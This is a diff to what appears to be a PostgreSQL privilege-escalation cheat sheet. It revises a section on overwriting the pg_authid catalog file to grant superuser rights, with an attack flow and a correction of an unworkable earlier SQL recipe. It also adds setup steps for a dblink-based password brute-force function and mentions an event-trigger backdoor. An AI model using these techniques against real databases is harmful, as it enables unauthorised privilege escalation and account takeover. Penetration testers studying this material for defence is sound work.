@@ -185,60 +185,46 @@ SELECT admin_func();
 
 ### Filenode Overwriting (pg_authid)
 
-Advanced technique to directly modify the pg_authid system table by overwriting its physical filenode. Requires `pg_read_server_files` and `pg_write_server_files`.
+**Important:** This is a **local privilege escalation** technique requiring filesystem-level write access to the PostgreSQL data directory (typically as `root` or `postgres` OS user). It is **not a pure SQL attack**.
 
-**Step 1: Find pg_authid Filenode:**
+**Limitations:**
+
+- `lo_import`/`lo_export` operate on `pg_largeobject` BLOBs, not raw relation files—they cannot directly overwrite system catalog files like `pg_authid` while PostgreSQL is running
+- PostgreSQL caches system catalogs in shared memory; modifying files while the server is running causes corruption or is ignored
+- The server must typically be **stopped** before modifying relation files
+- Requires in-depth knowledge of PostgreSQL binary heap/tuple formats to craft valid modifications
+
+**Filesystem-Level Attack Flow:**
+
+1. **Gain filesystem write access** to the data directory (e.g., via OS-level exploit, compromised backup, or misconfigured permissions)
+2. **Stop PostgreSQL** to release file locks and clear shared memory caches
+3. **Locate pg_authid filenode:**
+
+   ```bash
+   # Find data directory and pg_authid file
+   ls -la $PGDATA/global/1260  # pg_authid is in global/, not base/
+   ```
+
+4. **Back up original file** before modification
+5. **Modify the relation file** using a binary-aware tool that understands PostgreSQL heap page format (e.g., [pg_filedump](https://wiki.postgresql.org/wiki/Pg_filedump) for analysis, custom scripts for modification)
+   - Typical modifications: set `rolsuper = true`, `rolcreaterole = true`, or modify password hash
+6. **Restart PostgreSQL** to load modified catalog
+
+**SQL-Based Reconnaissance Only:**
 
 ```sql
--- Get filenode location
+-- Find pg_authid location (for reconnaissance, not modification)
 SELECT pg_relation_filenode('pg_authid');
 SELECT pg_relation_filepath('pg_authid');
--- Example: base/1/1260
+-- Note: pg_authid is in global/ tablespace, not base/<dboid>/
+
+-- Useful mapping tools:
+-- pg_relation_filenode() - returns filenode number
+-- pg_filenode_relation() - returns relation OID for a filenode
+-- oid2name (contrib) - CLI utility for OID/filenode mapping
 ```
 
-**Step 2: Download Filenode:**
-
-```sql
--- Import filenode as large object
-SELECT lo_import('/var/lib/postgresql/15/main/base/1/1260');
--- Returns OID
-
--- Read the content
-SELECT lo_get(OID);
-```
-
-**Step 3: Modify Filenode:**
-
-Use a hex editor or custom script to modify the raw filenode data. PostgreSQL provides built-in tools for filenode mapping:
-
-- [`pg_relation_filenode()`](https://www.postgresql.org/docs/current/functions-admin.html#FUNCTIONS-ADMIN-DBOBJECT) - returns the filenode number for a relation
-- [`pg_filenode_relation()`](https://www.postgresql.org/docs/current/functions-admin.html#FUNCTIONS-ADMIN-DBOBJECT) - returns the relation OID for a given filenode
-- [`oid2name`](https://www.postgresql.org/docs/current/oid2name.html) - contrib utility that maps OIDs to table/filenode names
-
-Modifications to pg_authid typically involve:
-
-- Set `rolsuper = true`
-- Set `rolcreaterole = true`
-- Set `rolcreatedb = true`
-- Modify password hash
-
-**Step 4: Upload Modified Filenode:**
-
-```sql
--- Create large object with modified content
-SELECT lo_from_bytea(0, decode('MODIFIED_FILENODE_BASE64', 'base64'));
-
--- Export to overwrite original
-SELECT lo_export(NEW_OID, '/var/lib/postgresql/15/main/base/1/1260');
-```
-
-**Step 5: Clear Caches:**
-
-```sql
--- Force PostgreSQL to re-read system catalogs
--- May require reconnection or specific operations
-SELECT pg_reload_conf();
-```
+**Related CVE:** CVE-2024-10979 (environment variable manipulation in PL/Perl allowing privilege escalation) demonstrates similar local privilege escalation vectors in PostgreSQL.
 
 ### Event Trigger Privilege Escalation
 
@@ -286,9 +272,20 @@ EXECUTE FUNCTION create_backdoor();
 
 ### Password Brute Force via PL/pgSQL
 
-Use procedural language to brute force database passwords:
+Use procedural language to brute force database passwords.
+
+**Requirements:**
+
+- The `dblink` extension must be installed (`CREATE EXTENSION dblink`)
+- Executing role must have permission to create functions and use dblink functions
+- Typically requires superuser or explicit `GRANT USAGE ON SCHEMA dblink` and function permissions
+
+**Alternative:** If dblink is unavailable, `postgres_fdw` can be used with similar connection-testing logic, but requires its own setup (CREATE SERVER, CREATE USER MAPPING) and different privilege requirements.
 
 ```sql
+-- Ensure dblink extension is available
+CREATE EXTENSION IF NOT EXISTS dblink;
+
 -- Create brute force function
 CREATE OR REPLACE FUNCTION brute_force(target_user TEXT, wordlist TEXT[])
 RETURNS TEXT
